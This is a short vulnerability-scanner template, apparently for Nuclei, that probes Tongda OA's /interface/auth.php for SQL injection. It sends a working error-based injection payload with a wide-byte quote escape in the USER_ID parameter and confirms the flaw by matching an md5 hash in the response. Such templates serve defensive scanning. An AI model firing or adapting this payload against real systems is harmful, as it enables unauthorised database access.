id: poc-yaml-tongda-interface-auth-sqli
info:
  name: 通达OA /auth.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - method: GET
    path:
      - "/interface/auth.php?PASSWORD=1&USER_ID=%df%27+and+(select+1+from+(select+count(*),concat((select+concat(0x3a,(select+md5({{t1}}))+,0x3a)+from+user+limit+1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)%23"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
        part: body
